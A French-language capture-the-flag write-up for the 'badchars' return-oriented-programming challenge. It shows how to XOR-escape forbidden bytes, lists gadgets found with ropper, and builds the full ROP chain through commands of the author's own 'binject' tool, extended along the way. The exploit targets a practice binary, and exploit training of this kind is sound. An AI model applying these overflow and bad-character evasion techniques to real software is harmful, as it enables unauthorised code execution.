# badchar challenge

## Organisons l'exploit

Si on lance le script, un print nous informe directement des caractères "invalides" pour ce programme:
> badchars are: 'x', 'g', 'a', '.'

Créons un simple programme C qui écrit tous les caractères de 0 à 255 dans un fichier texte pour ensuite l'envoyer au programme.
Après avoir injecté l'ensemble des charactères en mémoire (donc 40 caractères correctement géré par le programme et 216 autres en overflow),
aucun ne semble avoir été modifié. Provoquons l'overflow comme d'habitude, et ensuite envoyons tous les "badchars":
> binject -of tst.bin -ns 40 A -s xga. -s BBBBBBBBB

Dans ce cas-ci, nous remarquons facilement qu'aucun des *mauvais* caractères n'a correctement été envoyé:
> eb eb eb eb 42 42 42 42 42 42 42 42 42

Techniquement, il est impossible d'injecter ces caractères à travers de l'overflow; néanmoins, ces valeurs peuvent parfaitement résider en mémoire. 

## Moar XOR
L'idée sera donc d'entrer ses valeurs *transformée* pour ensuite les *retrouver* en mémoire à travers d'un gadget; le XOR (ou exclusif) est préconisé car c'est une opération **involutive**, qui lorsqu'elle est appliquée deux fois de suite, permet de retrouver la valeur originale.

$$
(a \oplus b) \oplus b = a 
$$

Cette opération pourrait pourrait nous permettre d'échapper les **badchars** en appliquant un XOR sur la valeur à échapper, la charger en mémoire pour ensuite lui ré-appliquer la même opération et ainsi obtenir le **badchar** en mémoire. Dans une optique plus ambitieuse, il nous permettrait de  modifier une return address dans la stack (pop -> xor -> push), à condition qu'il existe l'ensemble des gadgets nécessaires.

Le paramètre *"flag.txt"* que nous devons passer à la fonction `print_file` doit impérativement être injecté à travers de ce mécanisme, tout comme l'ensemble des éléménts écrits dans la stack à travers de l'*overflow*. A ce titre, l'utilitaire **ropper** fournit un flag permettant d'exclure un ensemble de caractères dans la recherche de gadget:
> -b \<badbytes>, --badbytes \<badbytes> **//** \<badbytes> *with hexadecimal format as 00 to FF* 

Toutefois, il conviendra de rester attentif à l'usage d'addresses et de chaînes de caractères n'incluant aucun **badchar**. 

Dans notre cas, nous pouvons assumer que l'unique élément de la chaîne devant être traité est le paramètre `flag.txt`; par traitement j'entends:
- Calculer une valeur *consistante* pour le XOR (le résultat ne doit pas être égal à un **badchar**).
- Identifier l'offset des bytes à traiter (**le XOR travaille au niveau d'un seul byte**):
    - `a` avec un offset de *+2*,
    - `g` avec un offset de *+3*,
    - `.` avec un offset de *+4*,
    - `x` avec un offset de *+6*.
- Modifier l'élément échappé en appliquant le XOR avec la valeur *consistante* sur les offsets identifiés.

Afin de faciliter les points étapes énoncées précedemment, ajoutons d'abbord un nouveau flag à **binject**.

## Binject modification
Soit `-bd` le flag qui admettrait deux paramètres obligatoire et *un optionnel*:
- [bd_bin] le nom d'un fichier binaire contenant tous les **badchars**.
- [ck_bin] le nom d'un fichier binaire contenant l'élément à scanner.
- [lc_opt] l'addresse du paramètre en mémoire:
    - *optionnel*, par défaut à 0. 
    - Son format est celui du flag `-x64`.

Lorsqu'utilisé, le flag `-bd` devra être l'unique sollicité dans la commande tel que:
> binject -bd bad.bin prm.bin

Le résultat serait le suivant:
- plusieurs fichiers binaires sont produits:
    - le fichier `xvl.bin`, qui contient la valeur *consistante* pour le XOR. 
    - le fichier `esc.bin`, qui contient `prm.bin` avec les **badchars** XORed.
- une sortie sur le terminal avec l'offset (byte représenté au format hexadécimal) pour chacun des **badchars** détecté.

Ce dernier élément de résultat, couplé au paramètre *optionnel* [lc_opt] permettrait à l'utilisateur d'intégrer les valeurs d'offset directement dans sa chaîne ROP.

[COMMIT](https://github.com/anarticho/binject/commit/a1f67b825dbfd7138b5730a11226395baf84a170)

Il ne nous reste maintenant plus qu'à identifier les ROP gadgets de l'executable afin de réaliser la chaîne ROP pour l'exploit. 

## Les gadgets

Si nous utilisons `ropper --file badchars --search "xxx"` pour identifier les ROP gadgets, il s'avère que le `mov qword ptr [r14], r15` n'est plus présent dans cet exécutable, à la place:
> 0x0000000000400634: mov qword ptr [r13], r12; ret;

Si on se réfère au gadget pour le XOR présent dans le programme; il permet d'effectuer l'opération OU-exclusif entre le byte de poids faible contenu dans le registre `%r14` et le byte pointé par l'addresse contenue par le registre `%r15`:
> 0x0000000000400628: xor byte ptr [r15], r14b; ret;

Sachant que dans le cadre de la mécanique d'échappement, nous aurons juste à modifier l'addresse contenue dans le registre `%r15`, nous pourrions utiliser les instructions suivantes pour rétablir la valeur des **badchars** en mémoire:
> 0x00000000004006a2: pop r15; ret; <br>
> Le ROP gadget `xor` 

D'ailleurs, il existe un gadget `pop` qui permet de récuperer l'ensemble des registres qui nous intéressent depuis la stack, à savoir `%r12` et `%r13` pour le `mov`, ainsi que `%r14` et `%r15` pour le `xor`:
> 0x000000000040069c: pop r12; pop r13; pop r14; pop r15; ret;

Ensuite, exactement le même mécanisme d'appel de fonction que celui pour le challenge *write4*, c'est à dire le ROP gadget `pop` sur `%rdi` avec l'addresse en mémoire du paramètre d'appel de `print_file`; `flag.txt`.
> 0x00000000004006a3: pop rdi; ret;

Et bien sûr, la fonction `print_file`, depuis la section **.plt**:
> 0x0000000000400510  print_file@plt


## La solution (et non, la feinte...)

0. Dans un premier temps nous allons modifier le paramètre `flag.txt`, utilisons le flag `-bd` créé précédemment.
- > binject -of bad.bin -s agx. <br>
binject -of prm.bin -s flag.txt <br>
binject -bd bad.bin prm.bin <br>
<br>
[\*] xvl.bin containing computed XOR value. <br>
[\*] Offset for detected bad characters: <br>
        - 2 <br>
        - 3 <br>
        - 4 <br>
        - 6 <br>
[\*] esc.bin containing XORed argument. <br>

1. Overflow du buffer vulnérable:
- > binject -of ovf.bin -ns 40 A

2. ROP gadget pour `pop` le contenu des registres `%r12`, `%r13`, `%r14` et `%r15` depuis la stack:
- `%r12` avec le paramètre `flag.txt` échappé par **binject -bd**, 
- `%r13` avec sa localisation en mémoire, au tout début de la section **.data**, 
- `%r14` avec la valeur à appliquer aux **badchars** avec le *XOR*.
- `%r15` avec sa localisation en mémoire + l'offset jusqu'au premier **badchar**,
- > binject -of reg.bin -x64 40069c -if esc.bin -x64 601028 -if xvl.bin -x64 60102A

3. ROP gadget `mov` pour copier la valeur contenue dans `%r12` à l'addresse contenue dans `%r13`: 
- > binject -of mem.bin -x64 400634

4. Chaînes ROP pour rétablir les **badchars** en mémoire en utilisant les gadgets `pop` et `xor`:
    0. Créons déjà un fichier binaire pour l'instruction:
    - > binject -of xor.bin -x64 400628
    1. Aussi, un autre fichier pour charger une addresse dans `%r15` avec un `pop`:
    - > binject -of r15.bin -x64 4006a2
    2. Ensuite, un fichier pour chaque **badchar** à échapper:
    - > binject -of bd1.bin -if xor.bin <br>
    - > binject -of bd2.bin -if r15.bin -x64 60102B -if xor.bin <br>
    - > binject -of bd3.bin -if r15.bin -x64 60102C -if xor.bin <br>
    - > binject -of bd4.bin -if r15.bin -x64 60102E -if xor.bin <br>
    3. Finalement, un fichier réunissant tous ces fichiers, dont la fonction sera d'*un-escape* et de rétablir les **badchars** en mémoire:
    - > binject -of usc.bin -if bd1.bin -if bd2.bin -if bd3.bin -if bd4.bin

5. Appel de la fonction `print_file`:
- > binject -of fnc.bin -x64 4006a3 -x64 601028 -x64 400510

Nous utiliserons encore et toujours un script **.sh** pour éviter d'avoir à re-générer tous les fichiers manuellement, la commande finale étant:
> binject -of ola.bin -if ovf.bin -if reg.bin -if mem.bin -if usc.bin -if fnc.bin

Sans oublier de donner les permissions au script:
> chmod +x ./le_script

Parce que la fonction **pwnme@plt** est particulièrement chiante, voici la commande **gdb** pour insérer un breakpoint sur son instruction `ret`:
> b *(0x7ffff7c00a06)

## Modification binject (encore)

Après avoir pensé n'avoir rien compris, j'ai remarqué une erreur... Un **badchar** dans une addresse ! A l'étape *4.2.*, l'addresse pour le fichier `ret` contient le byte `2E`... C'est très frustrant, car j'avais moi même dis d'y faire particulièrement attention mais bref!

Profitons de cette sensation de **sel** pour revenir sur notre utilitaire **binject** et lui ajouter un flag `-cb` (*check bad*). D'ailleurs, plutôt que de vérifier un seul et unique fichier binaire, l'idéal serait de pouvoir itérer sur tous les paramètres du script.

Avant cela, il serait aussi bon d'améliorer le flag `-bd` afin qu'il puisse admettre un paramètre pour une addresse x64, qui serait utilisé pour une représentation plus effective de l'offset.

Aussi, nous allons modifier le flag `-x64` à `-a` parce que ce sera d'autant plus facile pour intégrer un flag pour choisir l'architecture, et donc la taille et l'endianess de l'addresse ! Par défaut, nous fonctionnerons clairement avec la x64 et son little-endian. 

**Pour rappel, avec ses modification, plus aucun des scripts utilisant le flag `-x64` pour les challenges précédent ne fonctionnera** :3 Un jour nous parlerons de **migration**, mais ce n'est clairement pas le moment.

## La (vraie) solution

Dans la partie **## La solution**, nous avions déjà élaboré une chaîne ROP. Avec les modifications apportées à l'utilitaire **binject** vont permettre, dans un premier temps de générer automatiquement l'ensemble des fichiers pour le mécanisme d'échappement des **badchars** avec le flag `-bd`:
> binject -of bad.bin -s agx. <br>
> binject -of prm.bin -s flag.txt <br>
> binject -bd bad.bin prm.bin 601028 <br>

Aussi, nous pouvons vérifier la chaîne finale avec le flag `-cb`:
> binject -cb bad.bin -if ovf.bin -if reg.bin -if mem.bin -if usc.bin -if fnc.bin

Et il s'avère que cette chaîne contient toujours un badchar, dans une des addresses de **badchars**. Changeons de section donc, depuis la **.data** jusqu'à la **.bss** à l'addresse 601038.

Comme d'habitude, le résultat est le contenu du fichier `flag.txt`:
> ROPE{a_placeholder_32byte_flag!}
